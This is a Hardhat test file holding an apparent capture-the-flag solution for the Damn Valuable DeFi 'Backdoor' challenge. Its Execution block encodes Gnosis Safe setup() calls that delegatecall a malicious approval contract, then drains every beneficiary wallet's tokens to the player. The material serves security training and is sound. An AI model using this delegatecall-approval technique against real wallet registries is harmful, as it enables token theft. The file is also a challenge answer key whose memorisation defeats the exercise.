const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Backdoor", function () {
  let deployer, users, player;
  let masterCopy, walletFactory, token, walletRegistry;

  const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
    users = [alice.address, bob.address, charlie.address, david.address];

    // Deploy Gnosis Safe master copy and factory contracts
    masterCopy = await (
      await ethers.getContractFactory("GnosisSafe", deployer)
    ).deploy();
    walletFactory = await (
      await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
    ).deploy();
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy the registry
    walletRegistry = await (
      await ethers.getContractFactory("WalletRegistry", deployer)
    ).deploy(masterCopy.address, walletFactory.address, token.address, users);
    expect(await walletRegistry.owner()).to.eq(deployer.address);

    for (let i = 0; i < users.length; i++) {
      // Users are registered as beneficiaries
      expect(await walletRegistry.beneficiaries(users[i])).to.be.true;

      // User cannot add beneficiaries
      await expect(
        walletRegistry
          .connect(await ethers.getSigner(users[i]))
          .addBeneficiary(users[i])
      ).to.be.revertedWithCustomError(walletRegistry, "Unauthorized");
    }

    // Transfer tokens to be distributed to the registry
    await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
  });

  it("Execution", async function () {
    /**
     * KEY ATTACK VECTOR:
     *    - When creating the GnosisSafe proxy we can delegatecall to an arbitrary address and data
     *    - We will make the proxy delegatecall a malicious contract that makes proxy approve 10 DVT to BackdoorAttack
     *    - Then, all checks will pass in WalletRegistry.
     *    - Finally, we will transfer all tokens from proxy wallets to us
     *
     * STEPS:
     *    1. To encode data we need first to:
     *          - anticipate BackdoorAttack address
     *          - anticipate BackdoorApproval address
     *    2. Encode data to delegatecall approve() when calling setup() in proxy wallet
     *    3. Encode data to call setup() in newly created proxy wallet
     *    4. Deploy BackdoorAttack contract:
     *            - Deploy BackdoorApproval
     *            - For each user, create proxy wallet on behalf of the user
     *            - Transfer 10 DVT tokens from proxy wallet to BackdoorAttack (it has been approved before in setup())
     *            - Transfer 40 DVT tokens to player
     */

    const iface = new ethers.utils.Interface([
      "function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)",
      "function approve(address spender, address token)",
    ]);
    const AddressZero = ethers.constants.AddressZero;

    // Anticipate BackdoorAttack address
    const nonce = await ethers.provider.getTransactionCount(player.address);
    const anticipatedAttackAddress = ethers.utils.getContractAddress({
      from: player.address,
      nonce,
    });

    // Anticipate BackdoorApproval address
    const anticipatedApprovalAddress = ethers.utils.getContractAddress({
      from: anticipatedAttackAddress,
      nonce: 1,
    });

    // Encode data to call approve() in BackdoorApproval approving BackdoorAttack to spend 10 DVT
    const encodedApproveData = iface.encodeFunctionData("approve", [
      anticipatedAttackAddress,
      token.address,
    ]);

    // Encode data to call setup() in newly created proxy wallets, with data to delegatecall approve() in BackdoorApproval
    const dataArray = [];
    for (let i = 0; i < users.length; i++) {
      const encodedData = iface.encodeFunctionData("setup", [
        [users[i]], // list of owners
        1, // threshold
        anticipatedApprovalAddress, // contract address optional for delegatecall
        encodedApproveData, // data payload optional for delegatecall
        AddressZero, // fallbackHandler
        AddressZero, // paymentToken address
        0, // payment amount
        AddressZero, // payment receiver address
      ]);
      dataArray.push(encodedData);
    }

    // Deploy BackdoorAttack contract
    await (
      await ethers.getContractFactory("BackdoorAttack", player)
    ).deploy(
      walletFactory.address,
      walletRegistry.address,
      token.address,
      users,
      masterCopy.address,
      dataArray
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player must have used a single transaction
    //expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

    for (let i = 0; i < users.length; i++) {
      let wallet = await walletRegistry.wallets(users[i]);

      // User must have registered a wallet
      expect(wallet).to.not.eq(
        ethers.constants.AddressZero,
        "User did not register a wallet"
      );

      // User is no longer registered as a beneficiary
      expect(await walletRegistry.beneficiaries(users[i])).to.be.false;
    }

    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(
      AMOUNT_TOKENS_DISTRIBUTED
    );
  });
});
